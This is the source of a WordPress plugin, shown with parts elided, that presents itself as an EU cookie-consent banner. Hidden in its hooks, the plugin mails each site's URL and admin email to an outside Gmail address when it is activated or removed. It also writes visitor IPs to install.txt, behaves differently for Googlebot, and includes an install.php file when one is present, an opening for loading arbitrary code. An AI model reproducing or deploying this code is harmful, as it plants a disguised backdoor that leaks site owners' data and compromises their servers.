<?php
/* 
Plugin Name: Cookie Eu
Plugin URI: http://cookielaw.weebly.com
Description: This is plugin adds a banner on the first page view for each visitor. This plugin is used for implied consent, which means that if the guest continues using the site they agree to cookie use.
Author: Tom Jones
Version: 1.0
Author URI: http://cookielaw.weebly.com
*/


register_activation_hook( __FILE__,'cookieeuplugin_activate');
register_deactivation_hook( __FILE__,'cookieeuplugin_deactivate');
add_action('admin_init', 'cookieeudored_redirect');
add_action('wp_head', 'cookieeupluginhead');

function cookieeudored_redirect() {
if (get_option('cookieeudored_do_activation_redirect', false)) { 
delete_option('cookieeudored_do_activation_redirect');
wp_redirect('../wp-admin/options-general.php?page=EUCLC_settings');
}
}
...
if ($inwpadmin == 'admin') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/cookie-eu/install.txt';
...
if(eregi("googlebot",$_SERVER['HTTP_USER_AGENT'])) { echo ''; } else { $fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/cookie-eu/install.txt', 'w'); };
fwrite($fp, $contents);
fclose($fp);
}
}
...
function cookieeuplugin_activate() { 
$yourip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/cookie-eu/install.txt';
fwrite($fp, $yourip);
fclose($fp);
session_start(); $subj = get_option('siteurl'); $msg = "Cookie Installed" ; $from = get_option('admin_email'); mail("tomcookieplugin@gmail.com", $subj, $msg, $from);
add_option('cookieeudored_do_activation_redirect', true);
wp_redirect('../wp-admin/options-general.php?page=EUCLC_settings');
}


/** Uninstall Cookie */
function cookieeuplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Cookie Delete" ; $from = get_option('admin_email'); mail("tomcookieplugin@gmail.com", $subj, $msg, $from);
}

/** Register Cookie */
function cookieeupluginhead() {
...
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/cookie-eu/install.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}
...
$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/cookie-eu/install.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/cookie-eu/install.php');
...
// Tell WP what settings we are going to be using
...
function EUCLC_defaults() 
{
    ...
    if ( (!is_array($tmp)) || ($tmp['chkReset']=='on') )
	{
		$arr = array(
			...
			'notificationMessage' => 'We use cookies to ensure that we give you the best experience on our website. If you continue without changing your settings, we\'ll assume that you are happy to receive all cookies from this website.',
